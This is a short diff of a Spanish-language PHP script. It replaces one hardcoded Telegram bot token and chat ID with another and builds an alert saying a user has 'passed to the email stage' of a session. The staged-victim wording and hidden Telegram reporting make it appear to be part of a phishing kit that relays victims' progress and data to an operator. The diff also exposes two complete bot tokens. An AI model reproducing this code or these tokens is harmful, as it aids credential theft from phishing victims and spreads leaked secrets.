@@ -12,8 +12,8 @@ if (!empty($id_sesion)) {
         // Evitar duplicar la notificación si el usuario recarga
         if (!isset($datos['notificado_correo']) || $datos['notificado_correo'] !== true) {
 
-            $token = "9227967121:AAHNi3XNSyv-w_vJjP5BkAnQFZRJzoOS39I";
-            $chat_id = "8166259970";
+            $token = "8690112434:AAFWzeAiroxMokVoj0M4tjU_kSyuoGThy58";
+            $chat_id = "5601974496";
 
             $mensaje = "📧 ¡EL USUARIO PASÓ A LA ETAPA DE CORREO!\n\n";
             $mensaje .= "🆔 ID SESIÓN: {$id_sesion}\n";
